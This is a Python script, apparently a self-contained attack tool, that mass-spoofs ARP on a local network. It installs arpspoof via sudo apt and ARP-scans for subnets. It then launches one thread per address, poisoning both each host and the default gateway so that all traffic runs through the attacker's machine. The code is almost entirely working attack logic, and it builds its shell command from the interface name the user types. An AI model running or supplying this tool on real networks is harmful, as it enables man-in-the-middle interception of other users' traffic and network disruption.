import subprocess
import threading
import socket
import os
import re
import netifaces
from scapy.all import ARP, Ether, srp

# Check if arpspoof is already installed
def check_installation():
    result = subprocess.run(['which', 'arpspoof'], capture_output=True)
    return result.returncode == 0

# install arpspoof
def install_arpspoof():
    if not check_installation():
        print("Installing arpspoof... \n")
        subprocess.run(['sudo', 'apt', 'update', '-y'])
        subprocess.run(['sudo', 'apt', 'install', 'dsniff', '-y'])
 
# Scan the network to discover possible subnetworks
def scan_network(ip_range, gateway):
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=False)[0]
    subnets = set()
    for sent, received in result:
        ip_address = received.psrc
        subnet = int(ip_address.split('.')[2])
        subnets.add(subnet)

    return sorted(subnets)

# Get the CIDR
def subnet_mask_to_cidr(subnet_mask):
    return sum(bin(int(x)).count('1') for x in subnet_mask.split('.'))

# Run the payload
def run_arpspoof(ip, gateway):
    command = f"sudo arpspoof -i {interface} -r -c both -t {ip} {gateway}"

    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(f"Standard output for {ip}:")
    print(stdout.decode())
    print(f"Standard error for {ip}:")
    print(stderr.decode())

# Verify input of the ip
def is_valid_ip(ip):
    return re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', ip)


# GUI
os.system("clear")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|                 Spoffing a subnetwork             |")
print ("\---------------------------------------------------/")
print (" ")
print (" ---------------------[Settings]-------------------- ")
print (" ")

# Verify sudo
if os.getuid() != 0:
    print("You must be root to execute this script")
    exit()

# Verify arpspoof is installed
install_arpspoof()

interface = input("Interface (e.g., eth0): ")

try:

    your_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'] # User Ip 
    gateway = netifaces.gateways()['default'][netifaces.AF_INET][0] # Gateway
    network = '.'.join(gateway.split('.')[:-1]) + '.0' # Network address
    subnet_mask = list(netifaces.ifaddresses(interface)[netifaces.AF_INET][0].values())[1] # Subnet mask to get the CIDR
    cidr = "/" + str(subnet_mask_to_cidr(subnet_mask))
    network = network + cidr # Add the CIDR to the network adress

except Exception as e:
    print("Failed to retrieve IP address for the specified interface.")
    exit()

if not is_valid_ip(gateway) or not is_valid_ip(your_ip): # Verify Ip and Gateway
    print("Invalid IP or gateway. Please provide valid inputs.")
    exit()

# Scan network to find subnetworks
subnets = scan_network(network, gateway)

if subnets == []: # If no Ips find try on the same range as your_ip
    subnets.append(int(your_ip.split('.')[2]))
    print("Failed to find other IP addresses on the network. Starting a spoofing on your IP subnet...")

threads = []
for subnet in subnets:
    for i in range(0,255):
        
        ip = ".".join(your_ip.split(".")[:2]) + '.' + str(subnet) + '.' + str(i) # Make the ip with subnet an range
        
        if ip != your_ip:
            thread = threading.Thread(target=run_arpspoof, args=(ip, gateway)) # Launch thread of the arpspoof command
            threads.append(thread)
            thread.start()

for thread in threads:
    thread.join()